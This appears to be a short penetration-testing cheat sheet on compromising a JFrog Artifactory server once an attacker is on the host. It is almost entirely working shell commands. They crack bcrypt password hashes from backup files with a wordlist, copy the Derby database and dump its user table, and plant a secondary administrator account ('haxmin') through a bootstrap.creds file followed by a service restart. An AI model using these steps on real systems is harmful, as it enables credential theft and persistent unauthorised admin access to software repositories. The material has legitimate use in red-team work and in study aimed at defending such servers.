# Artifactory

## Crack accounts

```bash
# Find Artifactory directory 
cd /opt/jfrog/artifactory/var/backup/access
# Copy any found bcrypt hashes to a txt file and crack
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Compromising Artifactory's Database

{% code overflow="wrap" %}
```bash
# Create a temporary folder in /tmp for the database
mkdir /tmp/hackeddb
# Copy the database
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
# Change permissions
sudo chmod 755 /tmp/hackeddb/derby
# Remove any database lock files
sudo rm /tmp/hackeddb/derby/*.lck
# Connect to the copy of the database
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
connect 'jdbc:derby:/tmp/hackeddb/derby';
# Enumerate users in copied database
select * from access_users;
```
{% endcode %}

## Adding a Secondary Artifactory Admin Account

```bash
# Requires write access to /opt/jfrog/artifactory/var/etc/access folder
# Create a file called bootstrap.creds with below contents
haxmin@*=haxhaxhax
# Changing the file permissions
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
# Stop the Artifactory process
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
# Start the Artifactory process
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
# Verify in the log that the new user has been created
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
```
